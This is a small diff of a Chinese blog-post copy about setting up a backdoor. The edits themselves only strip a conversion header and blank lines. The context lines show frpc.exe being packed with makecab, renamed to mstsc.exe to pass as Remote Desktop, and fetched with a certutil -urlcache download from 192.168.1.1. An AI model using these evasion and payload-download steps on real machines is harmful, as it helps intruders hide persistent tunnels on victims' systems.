@@ -1,4 +1,4 @@
-\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[www.cnblogs.com\](https://www.cnblogs.com/-mo-/p/12539341.html)
+原文地址 \[www.cnblogs.com\](https://www.cnblogs.com/-mo-/p/12539341.html)
 
 后门文件配置：
 
@@ -47,14 +47,10 @@ makecab frpc.exe frpc.txt
 
 #解压
 expand C:\\Users\\RabbitMask\\Desktop\\test\\frpc.txt C:\\Users\\RabbitMask\\Desktop\\test\\mstsc.exe
-
-
 ```
 
 远程下载:
 
 ```
 certutil -urlcache -split -f http://192.168.1.1/frpc.txt  1.txt
-
-
 ```
